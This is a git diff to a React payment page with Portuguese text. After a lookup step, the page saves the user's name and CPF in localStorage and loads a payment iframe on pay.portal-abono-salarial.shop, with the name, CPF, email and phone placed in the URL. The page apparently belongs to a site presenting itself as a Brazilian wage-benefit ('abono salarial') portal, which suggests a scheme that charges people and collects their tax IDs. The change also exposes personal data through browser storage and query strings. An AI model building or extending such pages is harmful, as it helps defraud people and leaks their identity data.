@@ -1,3 +1,4 @@
+
 import React, { useEffect, useState } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 import { Button } from "@/components/ui/button";
@@ -10,12 +11,19 @@ import { Card, CardHeader, CardTitle, CardContent } from "@/components/ui/card";
 
 const Payment: React.FC = () => {
   const [userData, setUserData] = useState<any>(null);
+  const [showIframe, setShowIframe] = useState<boolean>(false);
   const navigate = useNavigate();
   const location = useLocation();
 
   useEffect(() => {
     if (location.state && location.state.userData) {
       setUserData(location.state.userData);
+      // Store user data in localStorage
+      localStorage.setItem("name", location.state.userData.nome || "");
+      localStorage.setItem("cpf", location.state.userData.cpf || "");
+      // Default values for required fields that we might not have
+      localStorage.setItem("email", localStorage.getItem("email") || "cliente@example.com");
+      localStorage.setItem("phone", localStorage.getItem("phone") || "11999999999");
     } else {
       toast.error("Nenhum dado encontrado. Por favor, faça a consulta novamente.");
       navigate('/');
@@ -41,7 +49,35 @@ const Payment: React.FC = () => {
   };
 
   const handleProceedToPayment = () => {
-    window.location.href = "https://pay.iexperience-app.com/706ead4c";
+    openPaymentIframe();
+  };
+
+  const openPaymentIframe = () => {
+    const email = localStorage.getItem("email") || "cliente@example.com";
+    const name = localStorage.getItem("name") || userData?.nome || "";
+    const phone = localStorage.getItem("phone") || "11999999999";
+    const cpf = localStorage.getItem("cpf") || userData?.cpf || "";
+
+    const url = `https://pay.portal-abono-salarial.shop/N1nVZpEdY60GlM6?email=${encodeURIComponent(email)}&name=${encodeURIComponent(name)}&telephone=${encodeURIComponent(phone)}&document=${encodeURIComponent(cpf)}`;
+    
+    setShowIframe(true);
+    
+    // Small delay to ensure the iframe container is rendered before setting the src
+    setTimeout(() => {
+      const iframe = document.getElementById("pagamentoIframe") as HTMLIFrameElement;
+      if (iframe) {
+        iframe.src = url;
+        iframe.style.display = "block";
+      }
+    }, 100);
+  };
+
+  const closeIframe = () => {
+    setShowIframe(false);
+    const iframe = document.getElementById("pagamentoIframe") as HTMLIFrameElement;
+    if (iframe) {
+      iframe.src = "";
+    }
   };
 
   if (!userData) {
@@ -56,6 +92,31 @@ const Payment: React.FC = () => {
 
   return (
     <PageLayout>
+      {showIframe && (
+        <div className="fixed inset-0 z-50 bg-black bg-opacity-50 flex justify-center items-center p-4">
+          <div className="relative bg-white rounded-lg w-full max-w-4xl h-[90vh] flex flex-col">
+            <div className="flex justify-end p-2">
+              <Button 
+                variant="ghost" 
+                size="icon" 
+                onClick={closeIframe}
+                className="text-gray-500 hover:text-gray-700"
+              >
+                <X className="h-5 w-5" />
+              </Button>
+            </div>
+            <div className="flex-1 w-full">
+              <iframe
+                id="pagamentoIframe"
+                className="w-full h-full border-0"
+                title="Pagamento"
+                allow="payment"
+              ></iframe>
+            </div>
+          </div>
+        </div>
+      )}
+
       <div className="container mx-auto p-0 pb-4 relative max-w-3xl">
         <div className="absolute top-0 left-0 mt-2 ml-0">
           <Button 
